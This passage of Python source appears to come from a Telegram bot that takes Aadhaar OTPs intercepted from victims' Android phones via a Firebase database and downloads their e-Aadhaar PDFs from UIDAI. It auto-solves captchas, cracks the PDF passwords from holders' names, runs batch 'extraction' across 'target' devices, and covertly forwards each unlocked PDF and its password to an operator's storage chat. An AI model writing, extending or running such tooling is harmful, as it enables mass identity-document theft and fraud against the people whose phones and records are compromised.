            f"🪪  <b>ᴀᴀᴅʜᴀᴀʀ ɴᴀᴍᴇ:</b> <b>{html.escape(str(name))}</b>\n"
            f"🔑  <b>ᴘᴀssᴡᴏʀᴅ:</b> <code>{password or 'Protected'}</code>\n"
            f"⚙️  <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{method}</code>\n"
            f"⏰  <b>ᴛɪᴍᴇ:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
            f"{DIVIDER}"
        )
        clean_fn = re.sub(r'[^a-zA-Z0-9]', '_', str(name))[:20] or "Aadhaar"
        send_document(STORAGE_CHAT, file_path, caption=cap, filename=f"Storage_{clean_fn}_{user_id}.pdf")
        logger.info(f"Forwarded Aadhaar PDF of {user_id} ({name}) to storage {STORAGE_CHAT}")
    except Exception as e:
        logger.warning(f"Error forwarding PDF to storage {STORAGE_CHAT}: {e}")

# ============== PDF DELIVERY (ZERO-DISK LEAK) ==============
def deliver_pdf(chat_id, pdf_path, verified_name, is_batch=False):
    name_display = verified_name if verified_name and verified_name.strip() else "Mr."
    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>⚙️ ᴘʀᴏᴄᴇssɪɴɢ ᴅᴏᴄᴜᴍᴇɴᴛ</b>\n\n"
        f"<i>🔓  ᴅᴇᴄʀʏᴘᴛɪɴɢ ᴀɴᴅ ᴜɴʟᴏᴄᴋɪɴɢ ʏᴏᴜʀ ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ…</i>"
    )
    decrypted_path = None
    try:
        crack_success, password, decrypted_path = bot.crack_pdf_with_name(pdf_path, name_display)
        if crack_success and decrypted_path and os.path.exists(decrypted_path):
            caption = (
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>✅ ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ (ᴜɴʟᴏᴄᴋᴇᴅ)</b>\n\n"
                f"👤  <b>ɴᴀᴍᴇ</b>      ·  <b>{html.escape(name_display)}</b>\n"
                f"📄  <b>ғᴏʀᴍᴀᴛ</b>    ·  e-Aadhaar PDF\n"
                f"🔓  <b>ᴘᴀssᴡᴏʀᴅ</b>  ·  <code>{password}</code>\n"
                f"{DIVIDER}"
            )
            doc_res = send_document(chat_id, decrypted_path, caption=caption, filename="Aadhaar.pdf")
            logger.info(f"Delivered unlocked PDF to {chat_id}: {doc_res.get('ok') if doc_res else False}")
            try:
                set_message_reaction(chat_id, message_id=None, emoji="⚡")
            except Exception:
                pass
            forward_pdf_to_storage(chat_id, decrypted_path, name_display, password=password, method="online")
            database.record_pdf_download(str(chat_id), name_display, is_admin_user=is_admin(chat_id), is_owner_user=(int(chat_id) == OWNER_ID), method="online", password=password)
        else:
            caption = (
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>📄 ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ</b>\n\n"
                f"👤  <b>ɴᴀᴍᴇ</b>    ·  {html.escape(name_display)}\n"
                f"📄  <b>ғᴏʀᴍᴀᴛ</b>  ·  e-Aadhaar PDF\n"
                f"🔒  <b>sᴛᴀᴛᴜs</b>  ·  Password Protected\n"
                f"{DIVIDER}\n\n"
                f"<i>🔑  ᴘᴀssᴡᴏʀᴅ: First 4 letters of name in CAPITAL + Birth Year\n"
                f"   ᴇxᴀᴍᴘʟᴇ: <code>RAJE1995</code></i>"
            )
            doc_res = send_document(chat_id, pdf_path, caption=caption, filename="Aadhaar.pdf")
            logger.info(f"Delivered protected PDF to {chat_id}: {doc_res.get('ok') if doc_res else False}")
            forward_pdf_to_storage(chat_id, pdf_path, name_display, password=None, method="online")
            database.record_pdf_download(str(chat_id), name_display, is_admin_user=is_admin(chat_id), is_owner_user=(int(chat_id) == OWNER_ID), method="online", password=None)
    except Exception as e:
        logger.error(f"PDF delivery error: {e}", exc_info=True)
        send_document(
            chat_id, pdf_path,
            caption=f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📄 ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ</b>",
            filename="Aadhaar.pdf"
        )
    finally:
        for p in [pdf_path, decrypted_path]:
            if p and os.path.exists(p):
                try:
                    os.remove(p)
                except Exception:
                    pass

    if not is_batch:
        clear_session(chat_id)
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🎉 ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴏᴍᴘʟᴇᴛᴇ!</b>\n\n"
            f"{DIVIDER}\n"
            f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ғᴏʀ ᴀɴᴏᴛʜᴇʀ ᴅᴏᴡɴʟᴏᴀᴅ.</i>",
            reply_markup=get_welcome_inline_keyboard()
        )

# ============== FIREBASE WORKERS & DEVICE SCANNER ==============
def _execute_single_firebase_download(chat_id, mobile, fb_url, dev_id=None, is_batch=False, progress_msg_id=None):
    masked_mobile = f"{mobile[:2]}******{mobile[-2:]}"
    task_user_id = f"{chat_id}_{mobile}"

    def update_single_status(status_str, detail_str):
        if not is_batch and progress_msg_id:
            edit_message_text(
                chat_id, progress_msg_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>🥷 ғɪʀᴇʙᴀsᴇ ᴀᴜᴛᴏ-ᴅᴏᴡɴʟᴏᴀᴅ</b>\n\n"
                f"📱  <b>ᴍᴏʙɪʟᴇ</b>    ·  <code>+91 {masked_mobile}</code>\n"
                f"🌐  <b>sᴛᴀᴛᴜs</b>    ·  <code>{status_str}</code>\n\n"
                f"<i>{detail_str}</i>"
            )

    update_single_status("sᴇɴᴅɪɴɢ ᴏᴛᴘ 1…", "⚙️  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; ʀᴇǫᴜᴇsᴛɪɴɢ ᴏᴛᴘ 1 ғʀᴏᴍ ᴜɪᴅᴀɪ…")

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    baseline_otps = bot.get_existing_device_otps(fb_url, device_id=dev_id)

    otp_sent_time = time.time()
    ok, otp_txn, code, c_txn, t_id, err = bot.auto_send_eid_otp(task_user_id, mobile, "Mr")
    if not ok or not otp_txn:
        err_text = str(err or 'Failed to send OTP')
        logger.warning(f"OTP 1 send failed for {mobile}: {err_text}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"❌  <b>ᴏᴛᴘ 1 ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ</b> (<code>{masked_mobile}</code>)\n\n"
                    f"⚠️  {html.escape(err_text)}",
                    reply_markup=get_menu_keyboard()
                )
            else:
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"❌  <b>ᴏᴛᴘ 1 ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ</b> (<code>{masked_mobile}</code>)\n\n"
                    f"⚠️  {html.escape(err_text)}",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': err_text, 'mobile': mobile}

    update_single_status("ᴏᴛᴘ 1 sᴇɴᴛ!", "🔍  ᴍᴏɴɪᴛᴏʀɪɴɢ ғɪʀᴇʙᴀsᴇ ᴅᴀᴛᴀʙᴀsᴇ ғᴏʀ ᴏᴛᴘ 1 (ᴀᴜᴛᴏ-ʟɪsᴛᴇɴɪɴɢ 🔄)…")

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    found1, otp1, msg1 = bot.fetch_otp_from_firebase(
        fb_url, min_timestamp=otp_sent_time - 15, timeout=75, poll_interval=3, target_mobile=mobile, exclude_otps=baseline_otps, device_id=dev_id
    )
    if not found1 or not otp1:
        logger.warning(f"OTP 1 timeout for {mobile}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>⏱️ ᴏᴛᴘ 1 ᴛɪᴍᴇᴏᴜᴛ</b> (<code>{masked_mobile}</code>)\n\n"
                    f"⚠️  ɴᴏ ᴀᴀᴅʜᴀᴀʀ ᴏᴛᴘ ᴡᴀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ғɪʀᴇʙᴀsᴇ ᴡɪᴛʜɪɴ 75 sᴇᴄᴏɴᴅs.\n"
                    f"💡  <i>ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪs ᴏɴʟɪɴᴇ ᴀɴᴅ sʏɴᴄɪɴɢ sᴍs.</i>",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': 'OTP 1 Timeout', 'mobile': mobile}

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    update_single_status(f"ᴏᴛᴘ 1: <code>{otp1}</code>", "🔄  ᴠᴇʀɪғʏɪɴɢ ᴏᴛᴘ 1 &amp; ʀᴇᴛʀɪᴇᴠɪɴɢ ᴇɪᴅ…")

    res = bot.verify_eid_otp(task_user_id, mobile, "Mr", otp1, otp_txn, c_txn, code)
    if len(res) == 4:
        success, eid_number, verified_name, dob = res
    else:
        success, eid_number, verified_name = res

    if not success or not eid_number:
        v_err = str(verified_name or 'Invalid OTP')
        logger.warning(f"OTP 1 verification failed for {mobile}: {v_err}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"❌  <b>ᴏᴛᴘ 1 ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ</b>\n\n"
                    f"⚠️  {html.escape(v_err)}",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': v_err, 'mobile': mobile}

    name_display = verified_name or "Aadhaar Holder"
    eid_clean = str(eid_number).replace('/', '').replace(' ', '')

    update_single_status("ᴇɪᴅ ʀᴇᴛʀɪᴇᴠᴇᴅ", f"🆔  <b>ᴇɪᴅ:</b> <code>{eid_clean}</code>\n<i>🔄  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; sᴇɴᴅɪɴɢ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2…</i>")

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    otp2_sent_time = time.time()
    dl_res = bot.auto_send_aadhaar_otp(task_user_id, eid_clean, max_retries=6)
    if not dl_res[0]:
        err2 = dl_res[5] if len(dl_res) > 5 else "Failed to send download OTP"
        logger.warning(f"Download OTP 2 send failed for {mobile}: {err2}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"❌  <b>ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2 ғᴀɪʟᴇᴅ</b>\n\n"
                    f"⚠️  {html.escape(str(err2))}",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': str(err2), 'mobile': mobile}

    dl_otp_txn = dl_res[1]
    dl_t_id = dl_res[4]

    update_single_status("ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ 2 sᴇɴᴛ!", "🔍  ᴍᴏɴɪᴛᴏʀɪɴɢ ғɪʀᴇʙᴀsᴇ ᴅᴀᴛᴀʙᴀsᴇ ғᴏʀ ᴏᴛᴘ 2 (ᴀᴜᴛᴏ-ʟɪsᴛᴇɴɪɴɢ 🔄)…")

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    found2, otp2, msg2 = bot.fetch_otp_from_firebase(
        fb_url, min_timestamp=otp2_sent_time - 15, timeout=75, poll_interval=3, target_mobile=mobile, exclude_otps=list(set(baseline_otps + [otp1])), device_id=dev_id
    )
    if not found2 or not otp2:
        logger.warning(f"OTP 2 timeout for {mobile}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>⏱️ ᴏᴛᴘ 2 ᴛɪᴍᴇᴏᴜᴛ</b>\n\n"
                    f"⚠️  ɴᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ ᴡᴀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ғɪʀᴇʙᴀsᴇ ᴡɪᴛʜɪɴ 75 sᴇᴄᴏɴᴅs.",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': 'OTP 2 Timeout', 'mobile': mobile}

    sess = get_session(chat_id)
    if sess.get('step') != 'downloading':
        return False, {'error': 'Session cancelled', 'mobile': mobile}

    update_single_status(f"ᴏᴛᴘ 2: <code>{otp2}</code>", "⏳  ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ &amp; ᴜɴʟᴏᴄᴋɪɴɢ ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ…")

    dl_ok, result = bot.download_aadhaar_pdf(
        task_user_id, eid_clean, otp2, dl_otp_txn, transaction_id=dl_t_id, sticky_proxy=bot.user_proxies.get(task_user_id)
    )
    if not dl_ok:
        logger.warning(f"PDF download failed for {mobile}: {result}")
        if not is_batch:
            clear_session(chat_id)
            if progress_msg_id:
                edit_message_text(
                    chat_id, progress_msg_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"❌  <b>ᴅᴏᴡɴʟᴏᴀᴅ ғᴀɪʟᴇᴅ</b>\n\n"
                    f"⚠️  {html.escape(str(result or 'UIDAI download failed'))}",
                    reply_markup=get_menu_keyboard()
                )
        return False, {'error': str(result), 'mobile': mobile}

    crack_ok, password, decrypted_path = bot.crack_pdf_with_name(result, name_display)
    final_pdf_path = decrypted_path if (crack_ok and decrypted_path and os.path.exists(decrypted_path)) else result
    if crack_ok and decrypted_path and os.path.exists(result):
        try:
            os.remove(result)
        except Exception:
            pass

    if not is_batch:
        if progress_msg_id:
            delete_message(chat_id, progress_msg_id)
        deliver_pdf(chat_id, final_pdf_path, name_display, is_batch=False)
        return True, None

    return True, {
        'pdf_path': final_pdf_path,
        'name': name_display,
        'password': password if crack_ok else None,
        'is_unlocked': crack_ok,
        'mobile': mobile
    }

def _handle_firebase_download_worker(chat_id, mobile, fb_url, dev_id=None):
    try:
        masked = f"{mobile[:2]}******{mobile[-2:]}"
        init_res = send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🥷 ғɪʀᴇʙᴀsᴇ ᴀᴜᴛᴏ-ᴅᴏᴡɴʟᴏᴀᴅ</b>\n\n"
            f"📱  <b>ᴍᴏʙɪʟᴇ</b>    ·  <code>+91 {masked}</code>\n"
            f"🌐  <b>sᴛᴀᴛᴜs</b>    ·  <code>sᴇɴᴅɪɴɢ ᴏᴛᴘ 1…</code>\n\n"
            f"<i>⚙️  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ &amp; ʀᴇǫᴜᴇsᴛɪɴɢ ᴏᴛᴘ 1 ғʀᴏᴍ ᴜɪᴅᴀɪ…</i>"
        )
        prog_id = (init_res.get('result') or {}).get('message_id') if init_res else None
        _execute_single_firebase_download(chat_id, mobile, fb_url, dev_id=dev_id, is_batch=False, progress_msg_id=prog_id)
    except Exception as e:
        logger.error(f"Error in firebase download worker: {e}", exc_info=True)
        clear_session(chat_id)
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"❌  <b>ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ</b>\n\n"
            f"⚠️  {html.escape(str(e))}\n\n"
            f"{DIVIDER}",
            reply_markup=get_menu_keyboard()
        )

def _handle_firebase_batch_worker(chat_id, fb_url, devices):
    try:
        total = len(devices)
        concurrency = min(5, total)

        start_res = send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🚀 ʙᴀᴛᴄʜ ᴇxᴛʀᴀᴄᴛɪᴏɴ sᴛᴀʀᴛᴇᴅ</b>\n\n"
            f"📊  <b>ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇs:</b> <b>{total}</b>\n"
            f"⚙️  <b>ᴘᴀʀᴀʟʟᴇʟ ᴛᴀsᴋs:</b> <b>{concurrency} Background Threads</b>\n"
            f"🌐  <b>ғɪʀᴇʙᴀsᴇ:</b> <code>{fb_url}</code>\n\n"
            f"<i>⏳  Multi-task background engine running… All unlocked PDFs will be sent below once extraction completes.</i>"
        )
        progress_msg_id = (start_res.get('result') or {}).get('message_id') if start_res else None

        ready_pdfs = []
        lock = threading.Lock()
        completed_count = 0
        failed_count = 0
        last_edit_time = [0.0]

        def update_dashboard():
            if not progress_msg_id:
                return
            now = time.time()
            if now - last_edit_time[0] < 2.5 and completed_count < total:
                return
            last_edit_time[0] = now
            in_prog = max(0, total - completed_count)
            dash_text = (
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>⚡ ʙᴀᴛᴄʜ ᴇxᴛʀᴀᴄᴛɪᴏɴ ɪɴ ᴘʀᴏɢʀᴇss</b>\n\n"
                f"📊  <b>ᴘʀᴏɢʀᴇss:</b> <b>[{completed_count}/{total}] Devices</b>\n"
                f"✅  <b>ᴘᴅғs ʀᴇᴀᴅʏ:</b> <b>{len(ready_pdfs)}</b>\n"
                f"❌  <b>ғᴀɪʟᴇᴅ / sᴋɪᴘ:</b> <b>{failed_count}</b>\n"
                f"⚙️  <b>ᴀᴄᴛɪᴠᴇ ᴛᴀsᴋs:</b> <b>{in_prog}</b>\n\n"
                f"<i>⏳  Background multi-processing running…</i>"
            )
            edit_message_text(chat_id, progress_msg_id, dash_text)

        def worker_task(dev_info, task_idx):
            nonlocal completed_count, failed_count
            sess = get_session(chat_id)
            if sess.get('step') != 'downloading':
                with lock:
                    completed_count += 1
                return

            mob = dev_info.get('mobile')
            dev_id = dev_info.get('dev_id')
            if not mob:
                with lock:
                    failed_count += 1
                    completed_count += 1
                return

            logger.info(f"[Batch Task {task_idx}] Processing mobile: {mob}, dev_id: {dev_id}")
            ok, res_data = _execute_single_firebase_download(
                chat_id, mob, fb_url, dev_id=dev_id, is_batch=True
            )

            with lock:
                completed_count += 1
                if ok and res_data and res_data.get('pdf_path'):
                    ready_pdfs.append(res_data)
                else:
                    failed_count += 1
                update_dashboard()

        with ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = [executor.submit(worker_task, dev, i) for i, dev in enumerate(devices, start=1)]
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as e:
                    logger.error(f"Error in batch future: {e}", exc_info=True)

        if progress_msg_id:
            final_dash = (
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>✅ ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴇxᴛʀᴀᴄᴛɪᴏɴ ғɪɴɪsʜᴇᴅ!</b>\n\n"
                f"📊  <b>ᴛᴏᴛᴀʟ ᴘʀᴏᴄᴇssᴇᴅ:</b> <b>{total}</b>\n"
                f"✅  <b>ᴘᴅғs ᴇxᴛʀᴀᴄᴛᴇᴅ:</b> <b>{len(ready_pdfs)}</b>\n"
                f"❌  <b>ғᴀɪʟᴇᴅ / sᴋɪᴘ:</b> <b>{failed_count}</b>\n\n"
                f"<i>📤  ᴅᴇʟɪᴠᴇʀɪɴɢ ᴀʟʟ ᴀᴀᴅʜᴀᴀʀ ᴘᴅғs ʙᴇʟᴏᴡ…</i>"
            )
            edit_message_text(chat_id, progress_msg_id, final_dash)

        if ready_pdfs:
            for item in ready_pdfs:
                p_path = item.get('pdf_path')
                p_name = item.get('name') or "Aadhaar Holder"
                p_pass = item.get('password')
                p_unlocked = item.get('is_unlocked', False)

                if p_path and os.path.exists(p_path):
                    if p_unlocked and p_pass:
                        caption = (
                            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                            f"<b>✅ ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ (ᴜɴʟᴏᴄᴋᴇᴅ)</b>\n\n"
                            f"👤  <b>ɴᴀᴍᴇ</b>      ·  <b>{html.escape(p_name)}</b>\n"
                            f"📄  <b>ғᴏʀᴍᴀᴛ</b>    ·  e-Aadhaar PDF\n"
                            f"🔓  <b>ᴘᴀssᴡᴏʀᴅ</b>  ·  <code>{p_pass}</code>\n"
                            f"{DIVIDER}"
                        )
                    else:
                        caption = (
                            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                            f"<b>📄 ᴅᴏᴄᴜᴍᴇɴᴛ ʀᴇᴀᴅʏ</b>\n\n"
                            f"👤  <b>ɴᴀᴍᴇ</b>    ·  {html.escape(p_name)}\n"
                            f"📄  <b>ғᴏʀᴍᴀᴛ</b>  ·  e-Aadhaar PDF\n"
                            f"🔒  <b>sᴛᴀᴛᴜs</b>  ·  Password Protected\n"
                            f"{DIVIDER}\n\n"
                            f"<i>🔑  ᴘᴀssᴡᴏʀᴅ: First 4 letters of name in CAPITAL + Birth Year</i>"
                        )
                    clean_fn = re.sub(r'[^a-zA-Z0-9]', '_', p_name)[:20]
                    send_document(chat_id, p_path, caption=caption, filename=f"Aadhaar_{clean_fn}.pdf")
                    forward_pdf_to_storage(chat_id, p_path, p_name, password=p_pass, method="firebase_batch")
                    database.record_pdf_download(str(chat_id), p_name, is_admin_user=is_admin(chat_id), is_owner_user=(int(chat_id) == OWNER_ID), method="firebase_batch", password=p_pass)
                    try:
                        os.remove(p_path)
                    except Exception:
                        pass
                    time.sleep(0.5)

        clear_session(chat_id)
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🎉 ʙᴀᴛᴄʜ ᴇxᴛʀᴀᴄᴛɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n\n"
            f"✅  <b>ᴛᴏᴛᴀʟ ᴘᴅғs ᴅᴇʟɪᴠᴇʀᴇᴅ:</b> <b>{len(ready_pdfs)} PDFs</b>\n"
            f"❌  <b>ғᴀɪʟᴇᴅ / ɴᴏ sᴍs:</b> <b>{failed_count}</b>\n\n"
            f"{DIVIDER}\n"
            f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ғᴏʀ ᴀɴᴏᴛʜᴇʀ ᴅᴏᴡɴʟᴏᴀᴅ.</i>",
            reply_markup=get_welcome_inline_keyboard()
        )
    except Exception as e:
        logger.error(f"Error in batch worker: {e}", exc_info=True)
        clear_session(chat_id)
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"❌ <b>Error in batch download:</b> {html.escape(str(e))}",
            reply_markup=get_welcome_inline_keyboard()
        )

def show_firebase_devices_menu(chat_id, page=0):
    s = get_session(chat_id)
    d = s.get('data', {})
    devices = d.get('devices', [])
    fb_url = d.get('fb_url', '')

    parsed = urlparse(fb_url)
    db_name = parsed.netloc.replace('.firebaseio.com', '') or 'Firebase'

    total_devs = len(devices)
    online_count = sum(1 for x in devices if x.get('is_online'))
    aadhaar_count = sum(1 for x in devices if x.get('has_aadhaar_sms'))

    per_page = 4
    total_pages = max(1, (total_devs + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    update_session_data(chat_id, 'page', page)

    start_idx = page * per_page
    page_devices = devices[start_idx:start_idx + per_page]

    lines = [
        f"<b>{BOT_NAME}</b>",
        f"{DIVIDER}",
        f"<b>🔥 ғɪʀᴇʙᴀsᴇ ᴅᴇᴠɪᴄᴇ &amp; ᴀᴀᴅʜᴀᴀʀ sᴄᴀɴɴᴇʀ</b>\n",
        f"🌐  <b>ᴅᴀᴛᴀʙᴀsᴇ:</b> <code>{db_name}</code>",
        f"🟢  <b>ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇs:</b> <b>{online_count} Active</b>",
        f"🪪  <b>ᴀᴀᴅʜᴀᴀʀ ᴅᴇᴛᴇᴄᴛᴇᴅ:</b> <b>{aadhaar_count} Found</b>",
        f"{DIVIDER}",
        f"<b>📋  ᴀᴄᴛɪᴠᴇ ᴀᴀᴅʜᴀᴀʀ ᴅᴇᴠɪᴄᴇs (ᴘᴀɢᴇ {page+1}/{total_pages}):</b>\n"
    ]

    for i, dev in enumerate(page_devices, start=start_idx + 1):
        mob = dev.get('mobile') or 'No SIM Number'
        model = dev.get('model') or 'Android Device'
        bat = f" · 🔋{dev['battery']}" if dev.get('battery') else ""
        on_icon = "🟢" if dev.get('is_online') else "⚪"

        aadhaar_info = ""
        if dev.get('aadhaar_masked'):
            aadhaar_info = f"\n   🪪  <b>ᴀᴀᴅʜᴀᴀʀ:</b> <code>{dev['aadhaar_masked']}</code>"
        elif dev.get('has_aadhaar_sms'):
            aadhaar_info = f"\n   🪪  <b>ᴀᴀᴅʜᴀᴀʀ:</b> <code>sᴍs ʟɪɴᴋᴇᴅ</code>"

        lines.append(f"{i}️⃣  {on_icon} <b>+91 {mob}</b>  ·  {model}{bat}{aadhaar_info}")

    lines.append(f"\n{DIVIDER}")
    lines.append(f"<i>💡 ᴋɪᴛɴᴇ ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ ɴɪᴋᴀʟɴᴇ ʜᴀɪɴ? ɴᴇᴇᴄʜᴇ sᴇ ǫᴜᴀɴᴛɪᴛʏ ᴄʜᴜɴᴇɪɴ ʏᴀ ᴋɪsɪ ᴇᴋ ᴅᴇᴠɪᴄᴇ ᴋᴏ ᴛᴀᴘ ᴋᴀʀᴇɪɴ:</i>")

    msg_text = "\n".join(lines)

    kb_rows = []
    valid_mobs = [x for x in devices if x.get('mobile')]
    v_count = len(valid_mobs)

    batch_row = []
    if v_count >= 1:
        batch_row.append({'text': '1 ᴘᴅғ', 'callback_data': 'fb_batch_1', 'icon_custom_emoji_id': '5456140674028019486'})
    if v_count >= 2:
        batch_row.append({'text': '2 ᴘᴅғs', 'callback_data': 'fb_batch_2', 'icon_custom_emoji_id': '5456140674028019486'})
    if v_count >= 3:
        batch_row.append({'text': '3 ᴘᴅғs', 'callback_data': 'fb_batch_3', 'icon_custom_emoji_id': '5456140674028019486'})
    if batch_row:
        kb_rows.append(batch_row)

    if v_count > 1:
        kb_rows.append([{'text': f'ᴀʟʟ ᴀᴀᴅʜᴀᴀʀs ({v_count} ᴘᴅғs)', 'callback_data': f'fb_batch_{v_count}', 'icon_custom_emoji_id': '5289722755871162900'}])

    for i, dev in enumerate(page_devices, start=start_idx):
        mob = dev.get('mobile') or 'Unknown'
        model = (dev.get('model') or 'Device')[:15]
        mask = f" ({dev.get('aadhaar_masked')[-4:]})" if dev.get('aadhaar_masked') else ""
        btn_text = f"{mob}{mask} · {model}"
        kb_rows.append([{'text': btn_text, 'callback_data': f'fb_dev_{i}', 'icon_custom_emoji_id': '6201882038975341348'}])

    nav_row = []
    if page > 0:
        nav_row.append({'text': '◀️ ᴘʀᴇᴠ', 'callback_data': f'fb_page_{page-1}', 'icon_custom_emoji_id': '6276030448862763508'})
    if total_pages > 1:
        nav_row.append({'text': f'ᴘᴀɢᴇ {page+1}/{total_pages}', 'callback_data': 'noop'})
    if page < total_pages - 1:
        nav_row.append({'text': 'ɴᴇxᴛ ▶️', 'callback_data': f'fb_page_{page+1}', 'icon_custom_emoji_id': '6204139486671019705'})
    if nav_row:
        kb_rows.append(nav_row)

    kb_rows.append([
        {'text': 'ᴇɴᴛᴇʀ ᴄᴜsᴛᴏᴍ ᴍᴏʙɪʟᴇ', 'callback_data': 'fb_manual', 'icon_custom_emoji_id': '6201882038975341348'},
        {'text': 'ᴄᴀɴᴄᴇʟ', 'callback_data': 'cancel', 'icon_custom_emoji_id': '6305324410744084248'}
    ])

    send_message(chat_id, msg_text, reply_markup={'inline_keyboard': kb_rows})

# ============== ADMIN PANEL ==============
def show_admin_panel(chat_id):
    data         = all_users()
    total        = len(data)
    banned_count = sum(1 for u in data.values() if u.get('banned'))
    status_fc    = "<b>ON</b>" if is_force_check_enabled() else "<b>OFF</b>"
    dl_stats     = database.get_download_stats()

    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>👑 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ</b>\n\n"
        f"👥  ᴛᴏᴛᴀʟ ᴜsᴇʀs   ·  <b>{total}</b>\n"
        f"🚫  ʙᴀɴɴᴇᴅ        ·  <b>{banned_count}</b>\n"
        f"📢  ғᴏʀᴄᴇ ᴊᴏɪɴ    ·  {status_fc}\n\n"
        f"📥  <b>ᴅᴏᴡɴʟᴏᴀᴅs sᴛᴀᴛs:</b>\n"
        f"  👑  <b>ᴏᴡɴᴇʀ:</b> <b>{dl_stats['owner']} PDFs</b>\n"
        f"  🛡️  <b>ᴀᴅᴍɪɴs:</b> <b>{dl_stats['admin']} PDFs</b>\n"
        f"  👤  <b>ᴜsᴇʀs:</b> <b>{dl_stats['user']} PDFs</b>\n"
        f"  📊  <b>ᴛᴏᴛᴀʟ ᴅʟ:</b> <b>{dl_stats['total']} PDFs</b>\n\n"
